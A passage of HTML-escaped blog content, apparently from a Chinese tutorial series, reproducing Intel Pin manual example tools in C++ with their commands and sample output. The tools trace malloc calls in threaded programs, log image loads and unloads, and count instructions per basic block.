class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize pin &amp; symbol manager</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\">    <span class=\"keyword\">if</span>( PIN_Init(argc,argv) )</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    TraceFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\">    TraceFile &lt;&lt; hex;</div><div class=\"line\">    TraceFile.setf(ios::showbase);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Register Image to be called to instrument functions.</span></div><div class=\"line\">    IMG_AddInstrumentFunction(Image, <span class=\"number\">0</span>);</div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* eof */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"Instrumenting-Threaded-Applications\"><a href=\"#Instrumenting-Threaded-Applications\" class=\"headerlink\" title=\"Instrumenting Threaded Applications\"></a>Instrumenting Threaded Applications</h1><p>下例演示了使用 ThreadStart() 和 ThreadFini() 通知回调函数。尽管 ThreadStart() 和 ThreadFini() 是在 VM 和 客户机锁 中执行，但他们依然同其他 analysis 例程竞争共享资源，使用  PIN_GetLock() 解决此问题。</p>\n<p>注意：当运行多线程程序时，如果Pin tool回调函数中有打开文件操作，会出现死锁。<br>解决方法：在 main 函数中打开文件，并使用 线程ID 标记数据，具体参见 source/tools/ManualExamples/buffer_windows.cpp<br>Linux中不存在此问题。</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ../../../pin -t obj-ia32/malloc_mt.so -- obj-ia32/thread_lin</div><div class=\"line\">$ head malloc_mt.out</div><div class=\"line\">thread begin <span class=\"number\">0</span></div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">24</span>d)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">57</span>)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(c)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">3</span>c0)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(c)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">58</span>)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">56</span>)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">19</span>)</div><div class=\"line\">thread <span class=\"number\">0</span> entered malloc(<span class=\"number\">25</span>c)</div></pre></td></tr></table></figure>\n<p>源码参见 source/tools/ManualExamples/malloc_mt.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"malloc_mt.out\"</span>, <span class=\"string\">\"specify output file name\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//==============================================================</span></div><div class=\"line\"><span class=\"comment\">//  Analysis Routines</span></div><div class=\"line\"><span class=\"comment\">//==============================================================</span></div><div class=\"line\"><span class=\"comment\">// <span class=\"doctag\">Note:</span>  threadid+1 is used as an argument to the PIN_GetLock()</span></div><div class=\"line\"><span class=\"comment\">//        routine as a debugging aid.  This is the value that</span></div><div class=\"line\"><span class=\"comment\">//        the lock is set to, so it must be non-zero.</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// lock serializes access to the output file.</span></div><div class=\"line\">FILE * out;</div><div class=\"line\">PIN_LOCK lock;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Note that opening a file in a callback is only supported on Linux systems.</span></div><div class=\"line\"><span class=\"comment\">// See buffer-win.cpp for how to work around this issue on Windows.</span></div><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"><span class=\"comment\">// This routine is executed every time a thread is created.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThreadStart</span><span class=\"params\">(THREADID threadid, CONTEXT *ctxt, INT32 flags, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_GetLock(&amp;lock, threadid+<span class=\"number\">1</span>);</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(out, <span class=\"string\">\"thread begin %d\\n\"</span>,threadid);</div><div class=\"line\">    fflush(out);</div><div class=\"line\">    PIN_ReleaseLock(&amp;lock);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This routine is executed every time a thread is destroyed.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThreadFini</span><span class=\"params\">(THREADID threadid, <span class=\"keyword\">const</span> CONTEXT *ctxt, INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_GetLock(&amp;lock, threadid+<span class=\"number\">1</span>);</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(out, <span class=\"string\">\"thread end %d code %d\\n\"</span>,threadid, code);</div><div class=\"line\">    fflush(out);</div><div class=\"line\">    PIN_ReleaseLock(&amp;lock);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This routine is executed each time malloc is called.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">BeforeMalloc</span><span class=\"params\">( <span class=\"keyword\">int</span> size, THREADID threadid )</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_GetLock(&amp;lock, threadid+<span class=\"number\">1</span>);</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(out, <span class=\"string\">\"thread %d entered malloc(%d)\\n\"</span>, threadid, size);</div><div class=\"line\">    fflush(out);</div><div class=\"line\">    PIN_ReleaseLock(&amp;lock);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//====================================================================</span></div><div class=\"line\"><span class=\"comment\">// Instrumentation Routines</span></div><div class=\"line\"><span class=\"comment\">//====================================================================</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This routine is executed for each image.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ImageLoad</span><span class=\"params\">(IMG img, VOID *)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    RTN rtn = RTN_FindByName(img, <span class=\"string\">\"malloc\"</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">if</span> ( RTN_Valid( rtn ))</div><div class=\"line\">    &#123;</div><div class=\"line\">        RTN_Open(rtn);</div><div class=\"line\">        </div><div class=\"line\">        RTN_InsertCall(rtn, IPOINT_BEFORE, AFUNPTR(BeforeMalloc),</div><div class=\"line\">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class=\"number\">0</span>,</div><div class=\"line\">                       IARG_THREAD_ID, IARG_END);</div><div class=\"line\"></div><div class=\"line\">        RTN_Close(rtn);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This routine is executed once at the end.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    fclose(out);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_ERROR(<span class=\"string\">\"This Pintool prints a trace of malloc calls in the guest application\\n\"</span></div><div class=\"line\">              + KNOB_BASE::StringKnobSummary() + <span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(INT32 argc, CHAR **argv)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize the pin lock</span></div><div class=\"line\">    PIN_InitLock(&amp;lock);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\">    </div><div class=\"line\">    out = fopen(KnobOutputFile.Value().c_str(), <span class=\"string\">\"w\"</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register ImageLoad to be called when each image is loaded.</span></div><div class=\"line\">    IMG_AddInstrumentFunction(ImageLoad, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Analysis routines to be called when a thread begins/ends</span></div><div class=\"line\">    PIN_AddThreadStartFunction(ThreadStart, <span class=\"number\">0</span>);</div><div class=\"line\">    PIN_AddThreadFiniFunction(ThreadFini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/\" target=\"_blank\" rel=\"external\">Pin 用户手册</a></p>\n"},{"title":"Intel Pin 2 ：示例（续）","url":"http://huirong.github.io/2016/01/07/Intel-Pin-example2/","content":"<p> 本文是<a href=\"http://huirong.github.io/2015/12/30/Intel-Pin-example/\">上篇文章</a>的续集。<br> <a id=\"more\"></a></p>\n<h1 id=\"Detecting-the-Loading-and-Unloading-of-Images-Image-Instrumentation\"><a href=\"#Detecting-the-Loading-and-Unloading-of-Images-Image-Instrumentation\" class=\"headerlink\" title=\"Detecting the Loading and Unloading of Images (Image Instrumentation)\"></a>Detecting the Loading and Unloading of Images (Image Instrumentation)</h1><p>下面的例子展示，每次加载或卸载镜像时，输出访问文件轨迹。此例仅做教学，并无实际意义。</p>\n<p>命令和结果：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">../../../pin -t obj-ia32/imageload.<span class=\"keyword\">so</span> -- /bin/<span class=\"keyword\">ls</span></div><div class=\"line\"><span class=\"keyword\">cat</span> imageload.<span class=\"keyword\">out</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ezru15kndlj30k80kogoo.jpg\" alt=\"\"></p>\n<p>源码详见 source/tools/ManualExamples/imageload.cpp</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"><span class=\"comment\">// This tool prints a trace of image load and unload events</span></div><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"imageload.out\"</span>, <span class=\"string\">\"specify file name\"</span>);</div><div class=\"line\"></div><div class=\"line\">ofstream TraceFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new img is loaded</span></div><div class=\"line\"><span class=\"comment\">// It can instrument the image, but this example does not</span></div><div class=\"line\"><span class=\"comment\">// Note that imgs (including shared libraries) are loaded lazily</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ImageLoad</span><span class=\"params\">(IMG img, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile &lt;&lt; <span class=\"string\">\"Loading \"</span> &lt;&lt; IMG_Name(img) &lt;&lt; <span class=\"string\">\", Image id = \"</span> &lt;&lt; IMG_Id(img) &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new img is unloaded</span></div><div class=\"line\"><span class=\"comment\">// You can't instrument an image that is about to be unloaded</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ImageUnload</span><span class=\"params\">(IMG img, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile &lt;&lt; <span class=\"string\">\"Unloading \"</span> &lt;&lt; IMG_Name(img) &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits</span></div><div class=\"line\"><span class=\"comment\">// It closes the output file.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (TraceFile.is_open()) &#123; TraceFile.close(); &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_ERROR(<span class=\"string\">\"This tool prints a log of image load and unload events\\n\"</span></div><div class=\"line\">             + KNOB_BASE::StringKnobSummary() + <span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize symbol processing</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    </div><div class=\"line\">    TraceFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Register ImageLoad to be called when an image is loaded</span></div><div class=\"line\">    IMG_AddInstrumentFunction(ImageLoad, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register ImageUnload to be called when an image is unloaded</span></div><div class=\"line\">    IMG_AddUnloadFunction(ImageUnload, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h1 id=\"More-Efficient-Instruction-Counting-Trace-Instrumentation\"><a href=\"#More-Efficient-Instruction-Counting-Trace-Instrumentation\" class=\"headerlink\" title=\"More Efficient Instruction Counting (Trace Instrumentation)\"></a>More Efficient Instruction Counting (Trace Instrumentation)</h1><p>上篇文章第一个例子 <a href=\"http://huirong.github.io/2015/12/30/Intel-Pin-example/\">Simple Instruction Count (Instruction Instrumentation)</a> ，在每条指令前插入一个函数，计算执行过的指令数。本节介绍一种更高效的方法，在插桩阶段，计算一个BBL中的指令数，然后累加每个BBL指令数。</p>\n<p>命令和结果：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">../../../pin -t obj-ia32/inscount1.<span class=\"keyword\">so</span> -- /bin/<span class=\"keyword\">ls</span></div><div class=\"line\"><span class=\"keyword\">cat</span> inscount.<span class=\"keyword\">out</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ezruetz3f1j30k30ei76c.jpg\" alt=\"\"></p>\n<p>源码参见 source/tools/ManualExamples/inscount1.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\">ofstream OutFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// The running count of instructions is kept here</span></div><div class=\"line\"><span class=\"comment\">// make it static to help the compiler optimize docount</span></div><div class=\"line\"><span class=\"keyword\">static</span> UINT64 icount = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every block</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">docount</span><span class=\"params\">(UINT32 c)</span> </span>&#123; icount += c; &#125;</div><div class=\"line\">    </div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new basic block is encountered</span></div><div class=\"line\"><span class=\"comment\">// It inserts a call to docount</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Trace</span><span class=\"params\">(TRACE trace, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Visit every basic block  in the trace</span></div><div class=\"line\">    <span class=\"keyword\">for</span> (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"comment\">// Insert a call to docount before every bbl, passing the number of instructions</span></div><div class=\"line\">        BBL_InsertCall(bbl, IPOINT_BEFORE, (AFUNPTR)docount, IARG_UINT32, BBL_NumIns(bbl), IARG_END);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"inscount.out\"</span>, <span class=\"string\">\"specify output file name\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    OutFile.setf(ios::showbase);</div><div class=\"line\">    OutFile &lt;&lt; <span class=\"string\">\"Count \"</span> &lt;&lt; icount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    OutFile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool counts the number of dynamic instructions executed\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    